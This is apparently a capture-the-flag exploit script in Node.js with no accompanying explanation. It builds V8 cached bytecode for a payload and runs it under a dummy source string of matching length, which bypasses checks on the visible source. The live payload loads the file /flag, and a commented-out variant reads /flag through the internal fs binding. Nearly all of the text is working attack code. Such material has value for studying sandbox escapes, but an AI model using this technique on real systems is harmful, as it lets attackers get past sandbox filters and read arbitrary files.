let vm = require('vm');

const readSourceHash = function (bytecodeBuffer) {
  if (!Buffer.isBuffer(bytecodeBuffer)) {
    throw new Error(`bytecodeBuffer must be a buffer object.`);
  }

  return bytecodeBuffer.slice(8, 12).reduce((sum, number, power) => sum += number * Math.pow(256, power), 0);
};

//let code = `f=process.binding("fs");b=Buffer.allocUnsafe(70);f.read(f.open("/flag",0,0,0,0),b,0,70,0,0,0);''+b`;
let code = `process.mainModule.load('/flag')`;
//let code=`console.log(Object.keys(process));`
console.log(code.length);
//let code = `throw('fuck')`;
let bc = new vm.Script(code, {
  produceCachedData: true
}).createCachedData();
let length = readSourceHash(bc);
console.log(length, bc.length);
console.log(bc.toString('hex'));
const script = new vm.Script('1'.repeat(length), { cachedData: bc });
const result = script.runInThisContext();
console.log(result);
debugger;